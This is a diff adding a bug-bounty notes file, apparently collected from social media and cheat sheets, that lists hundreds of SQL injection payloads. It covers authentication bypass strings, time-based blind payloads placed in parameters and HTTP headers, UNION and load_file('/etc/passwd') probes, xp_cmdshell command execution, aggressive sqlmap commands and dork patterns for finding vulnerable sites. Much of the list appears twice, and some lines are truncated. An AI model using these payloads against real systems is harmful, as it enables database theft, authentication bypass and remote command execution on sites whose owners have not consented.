@@ -1,0 +1,985 @@
+https://github.com/r0oth3x49/ghauri(sql injection tool after sqlmap use this )
+sql injection articles -----------------------
+https://omar0x01.medium.com/how-i-found-multiple-sql-injections-in-5-minutes-in-bug-bounty-40155964c498
+----------------------------------------------
+
+waybackurls https://redacted.org/ | uro | grep ".php" > php-files.txt
+
+username=admin’ or ‘1’=’1'#&password=admin&submit=
+admin' or '1' = '1
+admin' or '1' = '1' ' --
+
+url encoding---> admin%27+or+%271%27+%3D+%27 = admin' or '1' = '
+
+https://snurlaxx.medium.com/sqli-how-i-hacked-hundreds-of-students-data-on-goverment-website-5cd284fbb30c
+
+Impact
+An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further
+
+0'XOR(if(now()=sysdate(),sleep(12),0))XOR"Z(blind sql injection)
+
+This step is necessary to determine where we can put our own malicious query, that will be executed at the backend. 
+
+The query can be fixed in some of the ways below:
+‘’    --+
+‘    --+
+‘’    #
+‘     \*    *\
+‘    -- -
+'     or    '1
+
+For example if "list.php?id=8" and "list.php?id=9- POW(1,1)" is returning the same output,it means MySQL is running at the backend.
+
+Every DBMS uses different concatenation operators to store text input 
+Eg:
+
+Oracle:  'que' || 'ry’
+MySQL: ‘que’ ‘ry’
+SQL Server: ‘que’ + ‘r
+For example if "id=query" and "id=’que’ || ‘ry’"  is returning the same output, it means Oracle is running at the backend.
+
+' OR 1=1--
+' OR 1=0--
+%27%20or%201=1
+*(|(object=*))
+)%20or%20('x'='x
+%20or%201=1
+1) or pg_sleep(__5__)--
+/**/or/**/1/**/=1
+' or username like '%
+
+
+or isNULL(1/0) /*
+x' or 1=1 or 'x'='y
+
+‘+(select*from(select(sleep(20)))a)+’(for 5 base sql injection)
+
+---------------------------------(by orwa godfather)---------------------
+90% from my finds in SQL injection as
+ [POST Request] 
+1 Login page in username parameter 
+2 Forget password page username parameter
+3 Singup Page firstname and last name parameter
+
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+
+Username: name' waitfor delay '0:0:5'--
+
+sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
+-------------------------------------------------------------
+or 1=1
+or 1=1--
+or 1=1#
+
+or 1=1/*
+admin’--
+admin’ #
+admin’/*
+admin’ or ‘1’=’1
+admin’ or ‘1’=’1'--
+admin’ or ‘1’=’1'#
+admin’ or ‘1’=’1'/*
+admin’or 1=1 or ‘’=’
+admin’ or 1=1
+admin’ or 1=1--
+admin’ or 1=1#
+admin’ or 1=1/*
+admin’) or (‘1’=’1
+admin’) or (‘1’=’1'--
+admin’) or (‘1’=’1'#
+
+admin’) or (‘1’=’1'/*
+admin’) or ‘1’=’1
+admin’) or ‘1’=’1'--
+admin’) or ‘1’=’1'#
+admin’) or ‘1’=’1'/*
+1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055
+admin"--
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin" or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+)%20or%20('x'='x
+%20or%201=1
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+update
+";waitfor delay '0:0:__5__'--
+1) or pg_sleep(__5__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+"hi"") or (""a""=""a"
+delete
+like
+" or sleep(__5__)#
+pg_sleep(__5__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+insert
+1) or sleep(__5__)#
+) or ('a'='a
+; exec xp_regread
+*|
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+"a"" or 3=3--"
+" or benchmark(10000000,MD5(1))#
+# from wapiti
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__5__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+0
+21 %
+limit
+ or 1=1
+ or 2 > 1
+")) or benchmark(10000000,MD5(1))#
+PRINT
+hi') or ('a'='a
+ or 3=3
+));waitfor delay '0:0:__5__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+or%201=1
+1 or sleep(__5__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 'text' = n'text'
+ --
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+exec xp
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+3.10E+17
+" or pg_sleep(__5__)--
+x' AND email IS NULL; --
+&
+admin' or '
+ or 'unusual' = 'unusual'
+//
+truncate
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+declare @s varchar(200) select @s = 0x77616974 ...
+tz_offset
+sqlvuln
+"));waitfor delay '0:0:__5__'--
+||6
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+or a=a
+) union select * from information_schema.tables;
+PRINT @@variable
+or isNULL(1/0) /*
+26 %
+" or "a"="a
+(sqlvuln)
+x' AND members.email IS NULL; --
+ or 1=1--
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+0x770061006900740066006F0072002000640065006C00 ...
+%20'sleep%2050'
+as
+1)) or pg_sleep(__5__)--
+/**/or/**/1/**/=/**/1
+ union all select @@version--
+,@variable
+(sqlattempt2)
+ or (EXISTS)
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+%20$(sleep%2050)
+1 or benchmark(10000000,MD5(1))#
+%20or%20''='
+||UTL_HTTP.REQUEST
+ or pg_sleep(__5__)--
+hi' or 'x'='x';
+") or sleep(__5__)="
+ or 'whatever' in ('whatever')
+; begin declare @var varchar(8000) set @var=' ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
+0x77616974666F722064656C61792027303A303A313027 ...
+exec(@s)
+) or pg_sleep(__5__)--
+ union select
+ or sleep(__5__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(10)='
+ or 1 --'
+or 0=0 #"
+having
+a'
+" or isNULL(1/0) /*
+declare @s varchar (8000) select @s = 0x73656c ...
+â or 1=1 --
+char%4039%41%2b%40SELECT
+order by
+bfilename
+ having 1=1--
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:5'--
+" or 1=1--
+x' AND userid IS NULL; --
+*/*
+ or 'text' > 't'
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:5'--
+a' or 3=3--
+ -- &password=
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+select
+")) or sleep(5)="
+0x730065006c0065006300740020004000400076006500 ...
+hi' or 1=1 --
+") or pg_sleep(5)--
+%20or%20'x'='x
+ or 'something' = 'some'+'thing'
+exec sp
+29 %
+(
+Ã½ or 1=1 --
+1 or pg_sleep(5)--
+0 or 1=1
+) or (a=a
+uni/**/on sel/**/ect
+replace
+%27%20or%201=1
+)) or pg_sleep(5)--
+%7C
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+&apos;%20OR
+; or '1'='1'
+declare @q nvarchar (200) select @q = 0x770061 ...
+1 or 1=1
+; exec ('sel' + 'ect us' + 'er')
+23 OR 1=1
+/
+anything' OR 'x'='x
+declare @q nvarchar (4000) select @q =
+or 0=0 --
+desc
+||'6
+)
+1)) or sleep(5)#
+or 0=0 #
+ select name from syscolumns where id = (sele ...
+hi or a=a
+*(|(mail=*))
+password:*/=1--
+distinct
+);waitfor delay '0:0:__5__'--
+to_5stamp_tz
+") or benchmark(10000000,MD5(1))#
+ UNION SELECT
+%2A%28%7C%28mail%3D%2A%29%29
++sqlvuln
+ or 1=1 /*
+)) or sleep(__5__)='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+sqlvuln;
+ union select * from users where login = char ...
+x' or 1=1 or 'x'='y
+28 %
+â or 3=3 --
+@variable
+ or '1'='1'--
+"a"" or 1=1--"
+//*
+%2A%7C
+" or 0=0 --
+")) or pg_sleep(__5__)--
+?
+ or 1/*
+!
+'
+ or a = a
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or 1=1
+ or 1=1 --
+x' OR full_name LIKE '%Bob%
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'%20or%20''='
+'%20or%20'x'='x
+')%20or%20('x'='x
+' or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+' or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+or
+procedure
+handler
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+<>"'%;)(&+
+'%20or%201=1
+'sqlattempt1
+%28
+%29
+%26
+%21
+' or ''='
+' or 3=3
+ or 3=3 --
+
+
+-------------------------------------------------
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+
+---------------------------------------------------------
+
+
+https://github.com/tennc/fuzzdb/tree/master/attack-payloads/sql-injection
+
+
+
+sle%25p(5)
+sle%25p%28'0x12'%2b1)
+‘%2b12%2bif(user()+like+redacted%’,2,sle%45p%28'0x12'%2b1))+ — +s
+
+{${sleep(hexdec(dechex(40))))}}"
+
+anything’ or ‘1’=’1) or (admin’ or ‘1’=’1)
+ " '; -- " into the username field
+ (select(0)from(select(sleep(25)))v
+
+
+ search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
+
+admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc
+
+
+order=asc, (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 2 END))
+
+-------------------SQL dorking -----------
+index.php?id=
+trainers.php?id=
+buy.php?category=
+article.php?ID=
+inurllay_old.php?id=
+declaration_more.php?decl_id=
+games.php?id=
+inurlage.php?file=
+newsDetail.php?id=
+gallery.php?id=
+article.php?id=
+show.php?id=
+newsitem.php?num=
+readnews.php?id=
+top10.php?cat=
+historialeer.php?num=
+reagir.php?num=
+inurltray-Questions-View.php?num=
+forum_bds.php?num=
+game.php?id=
+------------------------------------------
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+X-Forwarded-For: 1
+
+xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'
+
+/wp-admin/admin.php?page=tp_editor&orderby=lang&orderby=lang&order=asc,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END))
+
+https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSQLI.md (best sql injection reports with different payloads)
+(select(0)from(select(sleep(25)))v)
+ '%2b(select*from(select(sleep(20)))a)%2b'
+ " AND (length(database())) = "11 --+-
+  " AND 1 = "1 --+- 
+
+  https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet(sql injection cheat sheet)
+
+  sqlmap -u “url” -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind"  --current-user --hostname (orwa)
+
+
+'+(select*from(select(sleep(0)))a)+'.pdf (for file upload sql injection
+)
+
+SQLi Auth Bypass Common Cheatsheet 
+
+or 1=1
+or 1=1–
+or 1=1#
+or 1=1/*
+admin” or “1”=”1″–
+admin” or “1”=”1″#
+admin” or “1”=”1″/*
+admin”or 1=1 or “”=”
+admin” or 1=1
+admin” or 1=1–
+admin” or 1=1#
+admin” or 1=1/*
+admin”) or (“1″=”1
+admin”) or (“1″=”1”–
+admin”) or (“1″=”1″#
+admin”) or (“1″=”1″/*
+admin”) or “1”=”1
+admin”) or “1”=”1″–
+admin”) or “1”=”1″#
+admin”) or “1”=”1″/*
+admin’ —
+admin’ #
+admin’/*
+admin’ or ‘1’=’1
+admin’ or ‘1’=’1′–
+admin’ or ‘1’=’1’#
+admin’ or ‘1’=’1’/*
+admin’or 1=1 or ”=’
+admin’ or 1=1
+admin’ or 1=1–
+admin’ or 1=1#
+admin’ or 1=1/*
+admin’) or (‘1’=’1
+admin’) or (‘1’=’1’–
+admin’) or (‘1’=’1’#
+admin’) or (‘1’=’1’/*
+admin’) or ‘1’=’1
+admin’) or ‘1’=’1′–
+admin’) or ‘1’=’1’#
+admin’) or ‘1’=’1’/*
+
+Md Ismail Sojal
+@0x0SojalSec
+·
+14h
+
+Blind SqLI
+Tips : X-Forwarded-For:
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR
+
+----------------------Login form--------
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1' = '1--
+User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
+
+---------------------orwa---------------------
+)%20or%20('x'='x
+%20or%201=1
+(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
+'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
+' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+1' OR NOT 2470=2470-- Ontu
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+";waitfor delay '0:0:__TIME__'--
+1) or pg_sleep(__TIME__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+"hi"") or (""a""=""a"
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+insert
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+*|
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+"a"" or 3=3--"
+" or benchmark(10000000,MD5(1))#
+# from wapiti
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+0
+21 %
+limit
+ or 1=1
+ or 2 > 1
+")) or benchmark(10000000,MD5(1))#
+PRINT
+hi') or ('a'='a
+ or 3=3
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+or%201=1
+1 or sleep(__TIME__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 'text' = n'text'
+ --
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+exec xp
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+3.10E+17
+" or pg_sleep(__TIME__)--
+x' AND email IS NULL; --
+&
+admin' or '
+ or 'unusual' = 'unusual'
+//
+truncate
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+declare @s varchar(200) select @s = 0x77616974 ...
+tz_offset
+sqlvuln
+"));waitfor delay '0:0:__TIME__'--
+||6
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+or a=a
+) union select * from information_schema.tables;
+PRINT @@variable
+or isNULL(1/0) /*
+26 %
+" or "a"="a
+(sqlvuln)
+x' AND members.email IS NULL; --
+ or 1=1--
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+0x770061006900740066006F0072002000640065006C00 ...
+%20'sleep%2050'
+as
+1)) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=/**/1
+ union all select @@version--
+,@variable
+(sqlattempt2)
+ or (EXISTS)
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+%20$(sleep%2050)
+1 or benchmark(10000000,MD5(1))#
+%20or%20''='
+||UTL_HTTP.REQUEST
+ or pg_sleep(__TIME__)--
+hi' or 'x'='x';
+") or sleep(__TIME__)="
+ or 'whatever' in ('whatever')
+; begin declare @var varchar(8000) set @var=' ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
+0x77616974666F722064656C61792027303A303A313027 ...
+exec(@s)
+) or pg_sleep(__TIME__)--
+ union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(__TIME__)='
+ or 1 --'
+or 0=0 #"
+having
+a'
+" or isNULL(1/0) /*
+declare @s varchar (8000) select @s = 0x73656c ...
+â or 1=1 --
+char%4039%41%2b%40SELECT
+order by
+bfilename
+ having 1=1--
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:__TIME__'--
+" or 1=1--
+x' AND userid IS NULL; --
+*/*
+ or 'text' > 't'
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+a' or 3=3--
+ -- &password=
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+select
+")) or sleep(__TIME__)="
+0x730065006c0065006300740020004000400076006500 ...
+hi' or 1=1 --
+") or pg_sleep(__TIME__)--
+%20or%20'x'='x
+ or 'something' = 'some'+'thing'
+exec sp
+29 %
+(
+Ã½ or 1=1 --
+1 or pg_sleep(__TIME__)--
+0 or 1=1
+) or (a=a
+uni/**/on sel/**/ect
+replace
+%27%20or%201=1
+)) or pg_sleep(__TIME__)--
+%7C
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+&apos;%20OR
+; or '1'='1'
+declare @q nvarchar (200) select @q = 0x770061 ...
+1 or 1=1
+; exec ('sel' + 'ect us' + 'er')
+23 OR 1=1
+/
+anything' OR 'x'='x
+declare @q nvarchar (4000) select @q =
+or 0=0 --
+desc
+||'6
+)
+1)) or sleep(__TIME__)#
+or 0=0 #
+ select name from syscolumns where id = (sele ...
+hi or a=a
+*(|(mail=*))
+password:*/=1--
+distinct
+);waitfor delay '0:0:__TIME__'--
+to_timestamp_tz
+") or benchmark(10000000,MD5(1))#
+ UNION SELECT
+%2A%28%7C%28mail%3D%2A%29%29
++sqlvuln
+ or 1=1 /*
+)) or sleep(__TIME__)='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+sqlvuln;
+ union select * from users where login = char ...
+x' or 1=1 or 'x'='y
+28 %
+â or 3=3 --
+@variable
+ or '1'='1'--
+"a"" or 1=1--"
+//*
+%2A%7C
+" or 0=0 --
+")) or pg_sleep(__TIME__)--
+?
+ or 1/*
+!
+'
+ or a = a
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or 1=1
+ or 1=1 --
+x' OR full_name LIKE '%Bob%
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'%20or%20''='
+'%20or%20'x'='x
+')%20or%20('x'='x
+' or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+' or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+or
+procedure
+handler
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+<>"'%;)(&+
+'%20or%201=1
+'sqlattempt1
+%28
+%29
+%26
+%21
+' or ''='
+' or 3=3
+ or 3=3 --
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+
+https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet (advance sql injection cheat sheet)
+
+Time-based SQLi with two payloads injected in the following headers:
+1. User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
+2. X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
+
+
+Payload: target(.)com/0'XOR(if(now()=sysdate(),sleep(3*2),0))XOR'Z/?akincibor=cachebuster
+
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+param='
+param="
+param=' or 1=1
+param=' or 1=0
+param=' and 1=1
+' or sleep(2) and 1=1#
+' or sleep(2)#
+admin' and sleep(2)#
+' union select sleep(2),null#
+' union select sleep(2),null,null,null,null#
+param=' or 1=1#
+param=' or 1=1
+param=' or 1=1 //
+param= or 1=1#
+param=and or 1=1#
+param=' or 1=1
+
+This is the most classic, standard first test:
+
+' or '1'='1
+
+Then you have:
+-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+
+#cybersecurity #hacking #bugbountytips
+
+2/9 👇🏿✔
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+
+3/9 👇🏿✔
+If nothing works try these Blind sql payloads:
+
+' AND (select 1)=1
+Guessing Table name:
+' AND (select 1 from admin limit 0,1)=1
+' AND (select 1 from users limit 0,1)=1
+"0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z"
+
+Guessing Columns:
+
+' AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1
+' AND (select substring(concat(1,password),1,1) from users limit 0,1)=
+Now determine number of columns in the current table
+
+param=' or 1=1 order by 1#
+
+param=' or 1=1 order by x.x.x.x
+
+let say there are 3 columns
+Abhishek Meena
+@Aacle_
+·
+21h
+BYPASSING filters
+
+we can use case switching or commenting to bypass normal filters such as union, select
+
+param=' or 1=0 UniOn selEct id,null,null FroM http://public.info
+
+param=' or 1=0 un//ion sele//ct id,null,null fr/**/om http://public.info# works in mssql
+Useful Resources
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+
+http://garage4hackers.com/showthread.php?t=1990
+
+1%27/**/%256fR/**/50%2521%253D22%253B%2523   
+==
+"0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z", 
+===
+query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login
+==
+' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
+if(now()=sysdate()%2Csleep(8)%2C0)
+
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z //pipelines + like
+
+0'or(now()=sysdate()&&SLEEP(1))or'Z //Double expressions(&&)
+
+(';waitfor delay '0:0:10'--)
+
+/0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z/
+
+https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet(advance sql injection cheat sheet)
+(select*from(select(sleep(5)))a)
+
+1%27/**/%256fR/**/50%2521%253D22%253B%2523   
+==
+"0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z", 
+===
+query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login
+==
+' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
+
+In username email,parameter 
+Sleep Payload : by @GodfatherOrwa
+ 
+
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+exploit👇
+sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+(SELECT * FROM (SELECT(SLEEP(10)))cfm)%2D%2D
+"-1 OR 2*2*1=4 AND 000123=000123 -- 
+(SELECT*FROM(SELECT(SLEEP(10))cfm)%2D%2D
